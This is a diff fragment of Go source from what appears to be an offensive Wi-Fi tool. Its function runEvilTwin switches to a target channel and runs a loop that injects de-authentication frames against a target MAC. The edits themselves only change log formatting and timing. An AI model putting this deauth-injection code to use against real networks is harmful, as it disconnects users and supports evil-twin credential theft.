@@ -1660,8 +1660,9 @@ func runEvilTwin(nameiface string) {
 								time.Sleep(2 * time.Second)
 							} else {
 								time.Sleep(1200 * time.Millisecond)
-								fmt.Println("Done")
 								handle2 = libs.GetMonitorSniffer(nameiface, color)
+								fmt.Println("Done")
+								time.Sleep(2 * time.Second)
 								break
 							}
 						}
@@ -1788,14 +1789,14 @@ func runEvilTwin(nameiface string) {
 			go func() {
 				time.Sleep(1 * time.Second)
 				libs.ChangeChannel(nameiface, tableinj.CHANNEL)
-				libs.CustomLog(color, color.Blue, "INJ-LOG", fmt.Sprintf("[%sINFO%s] %s: Started injection to [%s%s%s] with %sDe-Auth%s (%sReason 7%s)", colo.New(colo.BgGreen).Sprint("INFO"), color.White, nameiface, color.Green, libs.Fmac(tableinj.SRC[0]), color.White, color.Red, color.White, color.Purple, color.White))
+				libs.CustomLog(color, color.Blue, "INJ-LOG", fmt.Sprintf("[%sINFO%s] %s: Started injection to [%s%s%s] with %sDe-Auth%s (%sReason 7%s)", color.Green, color.White, nameiface, color.Green, libs.Fmac(tableinj.SRC[0]), color.White, color.Red, color.White, color.Purple, color.White))
 				for !panicExit {
 					for seq := 0; seq < 64; seq++ {
 						if panicExit {
 							break
 						}
 						if success := injpacket.InjectPacket(handle2, nameiface, tableinj.CHANNEL, tableinj.CHANNEL, injpacket.Deauth(tableinj.SRC[0], "", seq)); !success {
-							libs.CustomLog(color, color.Blue, "INJ-LOG", fmt.Sprintf("[%sINFO%s] %s: Injection error to [%s%s%s] with %sDe-Auth%s (%sReason 7%s) | (Can't inject packet?)", colo.New(colo.BgGreen).Sprint("INFO"), color.White, nameiface, color.Green, libs.Fmac(tableinj.SRC[0]), color.White, color.Red, color.White, color.Purple, color.White))
+							libs.CustomLog(color, color.Blue, "INJ-LOG", fmt.Sprintf("[%sINFO%s] %s: Injection error to [%s%s%s] with %sDe-Auth%s (%sReason 7%s) | (Can't inject packet?)", color.Green, color.White, nameiface, color.Green, libs.Fmac(tableinj.SRC[0]), color.White, color.Red, color.White, color.Purple, color.White))
 							time.Sleep(1200 * time.Millisecond)
 							break
 						}
@@ -1803,7 +1804,7 @@ func runEvilTwin(nameiface string) {
 					}
 					time.Sleep(180 * time.Millisecond)
 				}
-				libs.CustomLog(color, color.Blue, "INJ-LOG", fmt.Sprintf("[%sINFO%s] %s: Quitted injection to [%s%s%s] with %sDe-Auth%s (%sReason 7%s)", colo.New(colo.BgGreen).Sprint("INFO"), color.White, nameiface, color.Green, libs.Fmac(tableinj.SRC[0]), color.White, color.Red, color.White, color.Purple, color.White))
+				libs.CustomLog(color, color.Blue, "INJ-LOG", fmt.Sprintf("[%sINFO%s] %s: Quitted injection to [%s%s%s] with %sDe-Auth%s (%sReason 7%s)", color.Green, color.White, nameiface, color.Green, libs.Fmac(tableinj.SRC[0]), color.White, color.Red, color.White, color.Purple, color.White))
 			}()
 		}
 		for {
